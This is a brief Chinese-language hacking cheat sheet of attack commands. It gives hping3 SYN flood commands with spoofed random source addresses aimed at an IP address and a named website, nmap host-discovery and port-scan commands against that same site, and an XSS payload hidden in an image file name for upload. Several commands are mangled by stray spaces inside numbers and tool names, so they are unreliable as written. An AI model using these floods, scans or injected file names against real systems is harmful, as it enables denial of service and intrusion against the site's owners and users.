## Hacker
  
### hping 3 洪水攻击  
  
```  
sudo hping 3 --flood -S --rand-source -p 80 12 1.42.15 5.69  
sudo hping 3 -c 10 00 00 -d 12 0 -S -w 64 -p 80 --flood --rand-source www.integle.com  
```  
  
### 扫描指定网段存活的主机  
  
```  
sudo nmap -sP -Pl -PT 19 2.16 8.1.0/24  
```  
  
### 端口服务扫描  
  
```  
sudo nmap www.integle.com -p 0-65 53 5  
```  
  
### XSS 图片上传  

```  
"><img src=x onerror=alert(location.href)>.jpg  
```  
